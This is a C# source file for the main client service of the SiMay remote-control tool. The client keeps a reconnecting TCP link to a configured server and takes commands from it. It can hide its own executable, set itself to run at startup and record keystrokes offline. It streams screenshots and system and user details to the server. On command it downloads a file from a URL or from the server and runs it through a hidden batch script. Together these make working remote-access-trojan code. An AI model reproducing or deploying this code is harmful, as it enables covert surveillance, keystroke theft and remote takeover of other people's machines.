using Microsoft.Win32;
using SiMay.Core;
using System;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using SiMay.Core.Enums;
using SiMay.Core.Packets;
using SiMay.Core.ScreenSpy;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Client;
using SiMay.Sockets.Tcp.Session;
using SiMay.Sockets.Tcp.TcpConfiguration;
using SiMay.ServiceCore.ApplicationService;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Basic;
using System.Net;
using System.IO;
using SiMay.RemoteService.Entitys;
using SiMay.RemoteService.Interface;
using SiMay.Core.Extensions;
using SiMay.ServiceCore.Helper;
using SiMay.ServiceCore.Attributes;
using System.Drawing;

namespace SiMay.ServiceCore.MainService
{
    /// <summary>
    /// 主连接模块
    /// 作用：与服务端保持长连接，接收工作指令打开其他模块工作连接，意外断开时能主动重连
    /// </summary>
    public class MainService : IAppMainService
    {
        private bool _screenViewIsAction = false;
        private int _screen_record_height;
        private int _screen_record_width;
        private int _screen_record_spantime;
        private int _sessionKeep = 0;//主连接状态 0断开连接，1已连接

        private TcpSocketSaeaClientAgent _clientAgent;
        private TcpSocketSaeaSession _session;
        private ManagerTaskQueue _taskQueue = new ManagerTaskQueue();
        private PacketModelBinder<TcpSocketSaeaSession, MessageHead> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession, MessageHead>();
        public MainService(StartParameterEx startParameter)
        {
            while (true) //第一次解析域名,直至解析成功
            {
                var ip = IPHelper.GetHostByName(startParameter.Host);
                if (ip != null)
                {
                    AppConfiguartion.ServerIPEndPoint = new IPEndPoint(IPAddress.Parse(ip), startParameter.Port);
                    break;
                }

                Console.WriteLine(startParameter.Host ?? "address analysis is null");

                Thread.Sleep(5000);
            }
            AppConfiguartion.HostAddress = startParameter.Host;
            AppConfiguartion.HostPort = startParameter.Port;
            AppConfiguartion.AccessKey = startParameter.AccessKey;
            AppConfiguartion.DefaultRemarkInfo = startParameter.RemarkInformation;
            AppConfiguartion.DefaultGroupName = startParameter.GroupName;
            AppConfiguartion.IsAutoRun = startParameter.IsAutoStart;
            AppConfiguartion.IsHideExcutingFile = startParameter.IsHide;
            AppConfiguartion.RunTime = startParameter.RunTimeText;
            AppConfiguartion.Version = startParameter.ServiceVersion;
            AppConfiguartion.IsCentreServiceMode = startParameter.SessionMode == 1 ? true : false;
            AppConfiguartion.IdentifyId = startParameter.UniqueId;

            if (AppConfiguartion.IsHideExcutingFile)
                ComputerSessionHelper.SetExecutingFileHide(true);

            if (AppConfiguartion.IsAutoRun)
                ComputerSessionHelper.SetAutoRun(true);

            if (!int.TryParse(AppConfiguartion.ScreenRecordHeight, out _screen_record_height))
                _screen_record_height = 800;

            if (!int.TryParse(AppConfiguartion.ScreenRecordWidth, out _screen_record_width))
                _screen_record_width = 1200;

            if (!int.TryParse(AppConfiguartion.ScreenRecordSpanTime, out _screen_record_spantime))
                _screen_record_spantime = 3000;

            if (!bool.TryParse(AppConfiguartion.KeyboardOffline, out var bKeyboardOffline))
                bKeyboardOffline = false;

            if (bKeyboardOffline)
            {
                Keyboard keyboard = Keyboard.GetKeyboardInstance();
                keyboard.Initialization();
                keyboard.StartOfflineRecords();//开始离线记录
            }
            //创建通讯接口实例
            var clientConfig = new TcpSocketSaeaClientConfiguration();

            if (!AppConfiguartion.IsCentreServiceMode)
            {
                //服务版配置
                clientConfig.AppKeepAlive = true;
                clientConfig.KeepAlive = false;
            }
            else
            {
                //中间服务器版服务端配置
                clientConfig.AppKeepAlive = false;
                clientConfig.KeepAlive = true;
            }
            clientConfig.KeepAliveInterval = 5000;
            clientConfig.KeepAliveSpanTime = 1000;

            _clientAgent = TcpSocketsFactory.CreateClientAgent(TcpSocketSaeaSessionType.Packet, clientConfig, Notify);
            ConnectToServer();
        }


        /// <summary>
        /// Loader专用构造函数
        /// </summary>
        /// <param name="startParameter"></param>
        /// <param name="clientAgent"></param>
        /// <param name="session"></param>
        /// <param name="serviceIPEndPoint"></param>
        public MainService(
            StartParameter startParameter,
            TcpSocketSaeaClientAgent clientAgent,
            TcpSocketSaeaSession session,
            IPEndPoint serviceIPEndPoint
            )
        {
            _clientAgent = clientAgent;
            _session = session;
            _sessionKeep = 1;//主连接状态

            session.AppTokens = new object[2]
            {
                ConnectionWorkType.MAINCON,
                null
            };

            AppConfiguartion.HostAddress = startParameter.Host;
            AppConfiguartion.HostPort = startParameter.Port;
            AppConfiguartion.AccessKey = startParameter.AccessKey;
            AppConfiguartion.DefaultRemarkInfo = startParameter.RemarkInformation;
            AppConfiguartion.DefaultGroupName = startParameter.GroupName;
            AppConfiguartion.IsAutoRun = startParameter.IsAutoStart;
            AppConfiguartion.IsHideExcutingFile = startParameter.IsHide;
            AppConfiguartion.RunTime = startParameter.RunTimeText;
            AppConfiguartion.Version = startParameter.ServiceVersion;
            AppConfiguartion.IsCentreServiceMode = startParameter.SessionMode == 1 ? true : false;
            AppConfiguartion.IdentifyId = startParameter.UniqueId;
            AppConfiguartion.ServerIPEndPoint = serviceIPEndPoint;

            this.SendLoginPack(session);
        }

        private void ConnectToServer()
        {
            //IPEndPoint ipend;
            //if (!IPAddress.TryParse(AppConfiguartion.HostAddress, out var iPAddress))
            //    ipend = new IPEndPoint(iPAddress, AppConfiguartion.HostPort);
            //else
            //{
            ThreadHelper.ThreadPoolStart(x =>
            {
                var ip = IPHelper.GetHostByName(AppConfiguartion.HostAddress);//尝试解析域名
                if (ip.IsNullOrEmpty())
                    return;
                AppConfiguartion.ServerIPEndPoint = new IPEndPoint(IPAddress.Parse(ip), AppConfiguartion.HostPort);
            });
            //}
            _clientAgent.ConnectToServer(AppConfiguartion.ServerIPEndPoint);
        }

        private void SendMessageToServer(byte[] data)
        {
            if (_session == null)
                return;
            _session.SendAsync(data);
        }

        /// <summary>
        /// 发送确认包
        /// 
        /// 作用：连接确认，以便服务端识别这是一个有效的工作连接，type = 中间服务器识别
        /// </summary>
        /// <param name="session"></param>
        public void SendAckPack(TcpSocketSaeaSession session, ConnectionWorkType type)
        {
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.C_GLOBAL_CONNECT,
                new AckPack()
                {
                    AccessKey = AppConfiguartion.AccessKey,
                    Type = type
                });
            session.SendAsync(data);
        }

        /// <summary>
        /// 通信库主消息处理函数
        /// </summary>
        /// <param name="notify"></param>
        /// <param name="session"></param>
        public void Notify(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
        {
            try
            {
                switch (notify)
                {
                    case TcpSocketCompletionNotify.OnConnected:
                        this.ConnectedHandler(session, notify);
                        break;
                    case TcpSocketCompletionNotify.OnDataReceiveing:
                        break;
                    case TcpSocketCompletionNotify.OnDataReceived:
                        var workType = (ConnectionWorkType)session.AppTokens[0];
                        if (workType == ConnectionWorkType.MAINCON)
                            this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead<MessageHead>(), this);
                        else if (workType == ConnectionWorkType.WORKCON)
                        {
                            var appService = ((ServiceManagerBase)session.AppTokens[1]);
                            appService.HandlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead<MessageHead>(), appService);
                        }
                        break;
                    case TcpSocketCompletionNotify.OnClosed:
                        this.CloseHandler(session, notify);
                        break;
                }
            }
            catch (Exception ex)
            {
                StringBuilder sb = new StringBuilder();
                sb.Append(ex.Message);
                sb.Append(ex.StackTrace);
                LogHelper.WriteErrorByCurrentMethod(sb.ToString());

                Console.WriteLine(ex.Message);
            }

        }

        /// <summary>
        /// 连接初始化
        /// 
        /// 作用：分配工作类型
        /// </summary>
        /// <param name="session"></param>
        /// <param name="notify"></param>
        private void ConnectedHandler(TcpSocketSaeaSession session, TcpSocketCompletionNotify notify)
        {
            if (Interlocked.Exchange(ref _sessionKeep, 1) == 0)
            {
                this.SendAckPack(session, ConnectionWorkType.MAINCON);

                _session = session;
                //主连接优先获取session
                session.AppTokens = new object[2]
                {
                    ConnectionWorkType.MAINCON,
                    null
                };
            }
            else
            {
                this.SendAckPack(session, ConnectionWorkType.WORKCON);

                //消费工作实例
                ServiceManagerBase manager = _taskQueue.Dequeue();
                if (manager == null)
                {
                    //无工作实例。。连接分配不到工作
                    session.Close(false);
                    return;
                }
                session.AppTokens = new object[2]
                {
                    ConnectionWorkType.WORKCON,
                    manager
                };
                manager.SetSession(session);
            }

        }
        private void CloseHandler(TcpSocketSaeaSession session, TcpSocketCompletionNotify notify)
        {
            if (_sessionKeep == 0 && session.AppTokens == null)
            {
                //主连接连接失败
                session.AppTokens = new object[2]
                {
                    ConnectionWorkType.MAINCON,
                    null
                };
            }
            else if (_sessionKeep == 1 && session.AppTokens == null)//task连接，连接服务器失败
            {
                _taskQueue.Dequeue();//移除掉，不重试连接，因为可能会连接不上，导致频繁重试连接
                return;
            }

            var workType = (ConnectionWorkType)session.AppTokens[0];
            if (workType == ConnectionWorkType.MAINCON)
            {
                _screenViewIsAction = false;
                //清除主连接会话信息
                _session = null;
                Interlocked.Exchange(ref _sessionKeep, 0);

                System.Timers.Timer timer = new System.Timers.Timer();
                timer.Interval = 5000;
                timer.Elapsed += (s, e) =>
                {
                    //主连接重连
                    ConnectToServer();

                    timer.Stop();
                    timer.Dispose();
                };
                timer.Start();
            }
            else if (workType == ConnectionWorkType.WORKCON)
            {
                var appService = ((ServiceManagerBase)session.AppTokens[1]);
                if (appService.Closed)
                    return;
                appService.Closed = true;
                appService.SessionClosed();
            }
        }
        private void PostTaskToQueue(ServiceManagerBase manager)
        {
            this._taskQueue.Enqueue(manager);
            this.ConnectToServer();
        }

        [PacketHandler(MessageHead.S_MAIN_ACTIVATE_CTRLSERVICE)]
        public void ActiveControlService(TcpSocketSaeaSession session)
        {
            string key = session.CompletedBuffer.GetMessagePayload().ToUnicodeString();
            var context = SysUtil.ControlTypes.FirstOrDefault(x => x.ServiceKey.Equals(key));
            if (context != null)
            {
                var serviceName = context.AppServiceType.GetCustomAttribute<ServiceNameAttribute>(true).Name;
                SystemMessageNotify.ShowTip($"正在进行远程操作:{serviceName ?? context.ServiceKey}");
                var appService = Activator.CreateInstance(context.AppServiceType, null) as ServiceManagerBase;
                appService.AppServiceKey = context.ServiceKey;
                this.PostTaskToQueue(appService);
            }
        }

        [PacketHandler(MessageHead.S_MAIN_REMARK)]
        public void SetRemarkInfo(TcpSocketSaeaSession session)
        {
            var des = session.CompletedBuffer.GetMessagePayload().ToUnicodeString();
            AppConfiguartion.RemarkInfomation = des;
        }

        [PacketHandler(MessageHead.S_MAIN_GROUP)]
        public void SetGroupName(TcpSocketSaeaSession session)
        {
            var groupName = session.CompletedBuffer.GetMessagePayload().ToUnicodeString();
            AppConfiguartion.GroupName = groupName;
        }

        [PacketHandler(MessageHead.S_MAIN_SESSION)]
        public void SetSystemSession(TcpSocketSaeaSession session)
        {
            ComputerSessionHelper.SessionManager(session.CompletedBuffer.GetMessagePayload()[0]);
        }

        [PacketHandler(MessageHead.S_MAIN_RELOADER)]
        public void ReLoader(TcpSocketSaeaSession session)
        {
            Application.Restart();
        }

        [PacketHandler(MessageHead.S_MAIN_UPDATE)]
        public void UpdateService(TcpSocketSaeaSession session)
        {
            try
            {
                var pack = session.CompletedBuffer.GetMessageEntity<RemoteUpdatePack>();

                string tempFile = this.GetTempFilePath(".exe");
                if (pack.UrlOrFileUpdate == RemoteUpdateType.File)
                {
                    using (var stream = File.Open(tempFile, FileMode.Create, FileAccess.Write))
                    {
                        stream.Seek(0, SeekOrigin.Begin);
                        stream.Write(pack.FileDate, 0, pack.FileDate.Length);
                    }
                }
                else if (pack.UrlOrFileUpdate == RemoteUpdateType.Url)
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(pack.DownloadUrl, tempFile);
                    }
                }

                if (File.Exists(tempFile) && new FileInfo(tempFile).Length > 0)
                {
                    var batchFile = CreateBatch(Application.ExecutablePath, tempFile);
                    if (!batchFile.IsNullOrEmpty())
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            UseShellExecute = true,
                            FileName = batchFile
                        };
                        Process.Start(startInfo);

                        Environment.Exit(0);//退出程序
                    }
                    else
                    {
                        LogHelper.WriteErrorByCurrentMethod("远程更新失败，更新脚本创建失败!");
                    }
                }
                else
                {
                    LogHelper.WriteErrorByCurrentMethod("远程更新失败，服务端文件不存在!");
                }
            }
            catch (Exception ex)
            {
                LogHelper.WriteErrorByCurrentMethod(ex);
            }

            string CreateBatch(string currentFilePath, string newFilePath)
            {
                try
                {
                    string tempFilePath = this.GetTempFilePath(".bat");

                    string updateBatch =
                        "@echo off" + "\r\n" +
                        "chcp 65001" + "\r\n" +
                        "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                        "ping -n 10 localhost > nul" + "\r\n" +
                        "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "del /a /q /f " + "\"" + tempFilePath + "\"";

                    File.WriteAllText(tempFilePath, updateBatch, new UTF8Encoding(false));
                    return tempFilePath;
                }
                catch (Exception)
                {
                    return string.Empty;
                }
            }
        }

        private string GetTempFilePath(string extension)
        {
            string tempFilePath;
            do
            {
                tempFilePath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + extension);
            } while (File.Exists(tempFilePath));

            return tempFilePath;
        }

        [PacketHandler(MessageHead.S_MAIN_HTTPDOWNLOAD)]
        public void HttpDownloadExecute(TcpSocketSaeaSession session)
        {
            DownloadHelper.DownloadFile(session.CompletedBuffer.GetMessagePayload());
        }

        [PacketHandler(MessageHead.S_MAIN_OPEN_WEBURL)]
        public void OpenUrl(TcpSocketSaeaSession session)
        {
            try
            {
                Process.Start(session.CompletedBuffer.GetMessagePayload().ToUnicodeString());
            }
            catch { }
        }
        [PacketHandler(MessageHead.S_MAIN_DESKTOPVIEW)]
        public void CreateDesktopView(TcpSocketSaeaSession session)
        {
            var isConstraint = session.CompletedBuffer.GetMessagePayload()[0];
            AppConfiguartion.IsOpenScreenView = "true";
            if (_screenViewIsAction != true || isConstraint == 0)
                this.OnRemoteCreateDesktopView();
        }

        /// <summary>
        /// 发送桌面下一帧
        /// </summary>
        /// <param name="session"></param>
        [PacketHandler(MessageHead.S_MAIN_SCREENWALL_GETIMG)]
        public void SendNextScreenView(TcpSocketSaeaSession session)
        {
            ThreadPool.QueueUserWorkItem(c =>
            {
                var getframe = session.CompletedBuffer.GetMessageEntity<DesktopViewGetFramePack>();
                if (getframe.Width == 0 || getframe.Height == 0 || getframe.TimeSpan == 0 || getframe.TimeSpan < 50)
                    return;

                Thread.Sleep(getframe.TimeSpan);

                byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.C_MAIN_SCREENWALL_IMG,
                    ImageExtensionHelper.CaptureNoCursorToBytes(new Size(getframe.Width, getframe.Height)));

                SendMessageToServer(data);
            });
        }
        [PacketHandler(MessageHead.S_MAIN_USERDESKTOP_CLOSE)]
        public void CloseDesktopView(TcpSocketSaeaSession session)
        {
            _screenViewIsAction = false;
            AppConfiguartion.IsOpenScreenView = "false";
        }
        [PacketHandler(MessageHead.S_MAIN_SCREEN_RECORD_OPEN)]
        public void ActionScreenRecord(TcpSocketSaeaSession session)
        {
            var getframe = session.CompletedBuffer.GetMessageEntity<DesktopRecordGetFramePack>();
            _screen_record_height = getframe.Height;
            _screen_record_width = getframe.Width;
            _screen_record_spantime = getframe.TimeSpan;

            if (_screen_record_height <= 0 || _screen_record_width <= 0 || _screen_record_spantime < 500)
                return;

            AppConfiguartion.ScreenRecordHeight = _screen_record_height.ToString();
            AppConfiguartion.ScreenRecordWidth = _screen_record_width.ToString();
            AppConfiguartion.ScreenRecordSpanTime = _screen_record_spantime.ToString();
            AppConfiguartion.IsScreenRecord = "true";

            //主机名称作为目录名
            this.SendMessageToServer(MessageHelper.CopyMessageHeadTo(MessageHead.C_MAIN_SCREEN_RECORD_OPEN, Environment.MachineName));
        }
        [PacketHandler(MessageHead.S_MAIN_SCREEN_RECORD_CLOSE)]
        public void ScreenRecordClose(TcpSocketSaeaSession session)
        {
            AppConfiguartion.IsScreenRecord = "false";
        }

        /// <summary>
        /// 远程创建屏幕墙屏幕视图
        /// </summary>
        private void OnRemoteCreateDesktopView()
        {
            _screenViewIsAction = true;
            //创建屏幕
            string RemarkName = AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo;

            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.C_MAIN_USERDESKTOP_CREATE,
                new DesktopViewDescribePack()
                {
                    MachineName = Environment.MachineName,
                    RemarkInformation = RemarkName
                });

            SendMessageToServer(data);
        }



        /// <summary>
        /// 发送下一帧屏幕记录
        /// </summary>
        /// <param name="width"></param>
        /// <param name="height"></param>
        [PacketHandler(MessageHead.S_MAIN_SCREEN_RECORD_GETIMG)]
        public void SendNextScreenRecordView(TcpSocketSaeaSession session)
        {

            ThreadPool.QueueUserWorkItem((o) =>
            {
                if (_screen_record_width == 0 || _screen_record_height == 0)
                    return;

                Thread.Sleep(_screen_record_spantime);

                byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.C_MAIN_SCREEN_RECORD_IMG,
                    ImageExtensionHelper.CaptureNoCursorToBytes(new Size(_screen_record_width, _screen_record_height)));

                SendMessageToServer(data);
            });
        }

        [PacketHandler(MessageHead.S_MAIN_MESSAGEBOX)]
        public void ShowMessageBox(TcpSocketSaeaSession session)
        {
            var msg = session.CompletedBuffer.GetMessageEntity<MessagePack>();
            ThreadHelper.CreateThread(() =>
            {
                string title = msg.MessageTitle;
                string cont = msg.MessageBody;

                switch ((MessageIcon)msg.MessageIcon)
                {
                    case MessageIcon.Error:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIcon.Question:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIcon.InforMation:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;

                    case MessageIcon.Exclaim:
                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
                        break;
                }
            }, true);
        }
        /// <summary>
        /// 发送上线包
        /// </summary>
        [PacketHandler(MessageHead.S_GLOBAL_OK)]
        public void SendLoginPack(TcpSocketSaeaSession session)
        {
            string remarkInfomation = AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo;
            string groupName = AppConfiguartion.GroupName ?? AppConfiguartion.DefaultGroupName;
            string openScreenWall = AppConfiguartion.IsOpenScreenView ?? "true";//默认为打开屏幕墙
            string openScreenRecord = AppConfiguartion.IsScreenRecord ?? "false"; //默认屏幕记录

            var loginPack = new LoginPack();
            loginPack.IPV4 = SystemInfoHelper.GetLocalIPV4();
            loginPack.MachineName = Environment.MachineName ?? "";
            loginPack.Remark = remarkInfomation;
            loginPack.ProcessorCount = Environment.ProcessorCount;
            loginPack.ProcessorInfo = SystemInfoHelper.GetMyCpuInfo;
            loginPack.MemorySize = SystemInfoHelper.GetMyMemorySize;
            loginPack.StartRunTime = AppConfiguartion.RunTime;
            loginPack.ServiceVison = AppConfiguartion.Version;
            loginPack.UserName = Environment.UserName.ToString();
            loginPack.OSVersion = SystemInfoHelper.GetOSFullName;
            loginPack.GroupName = groupName;
            loginPack.OpenScreenWall = (openScreenWall == "true" ? true : false);
            loginPack.ExistCameraDevice = SystemInfoHelper.ExistCameraDevice();
            loginPack.ExitsRecordDevice = SystemInfoHelper.ExistRecordDevice();
            loginPack.ExitsPlayerDevice = SystemInfoHelper.ExistPlayDevice();
            loginPack.IdentifyId = AppConfiguartion.IdentifyId;
            loginPack.OpenScreenRecord = (openScreenRecord == "true" ? true : false);
            loginPack.RecordHeight = _screen_record_height;
            loginPack.RecordWidth = _screen_record_width;
            loginPack.RecordSpanTime = _screen_record_spantime;
            loginPack.HasLoadServiceCOM = true;//已加载

            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.C_MAIN_LOGIN,
                loginPack);

            SendMessageToServer(data);
        }
    }
}